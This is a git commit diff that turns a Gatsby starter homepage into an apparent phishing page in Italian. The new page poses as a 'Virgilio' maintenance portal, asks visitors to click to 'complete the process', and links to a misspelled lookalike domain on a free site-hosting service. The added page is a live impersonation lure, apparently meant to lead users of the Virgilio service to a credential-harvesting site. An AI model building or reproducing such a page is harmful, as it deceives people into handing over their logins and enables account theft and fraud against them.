20f68f1a3e3af52e9a24a375ee888fe84245c3c2
brianheather <87387671+brianheather@users.noreply.github.com>
2021-07-26 15:04:44 +0100

    Update index.js

--- src/pages/index.js
+++ src/pages/index.js
@@ -1,29 +1,16 @@
 import * as React from "react"
 import { Link } from "gatsby"
-import { StaticImage } from "gatsby-plugin-image"
 
 import Layout from "../components/layout"
 import Seo from "../components/seo"
 
-const IndexPage = () => (
+const SecondPage = () => (
   <Layout>
-    <Seo title="Home" />
-    <h1>Hi people</h1>
-    <p>Welcome to your new Gatsby site.</p>
-    <p>Now go build something great.</p>
-    <StaticImage
-      src="../images/gatsby-astronaut.png"
-      width={300}
-      quality={95}
-      formats={["AUTO", "WEBP", "AVIF"]}
-      alt="A Gatsby astronaut"
-      style={{ marginBottom: `1.45rem` }}
-    />
-    <p>
-      <Link to="/page-2/">Go to page 2</Link> <br />
-      <Link to="/using-typescript/">Go to "Using TypeScript"</Link>
-    </p>
+    <Seo title="Virgilio" />
+    <h1>Portale di Manutenzione Virgilio</h1>
+    <p>Clicca qui sotto per completare il processo</p>
+    <Link to="https://virgillio.yolasite.com/">Portale Virgilio</Link>
   </Layout>
 )
 
-export default IndexPage
+export default SecondPage
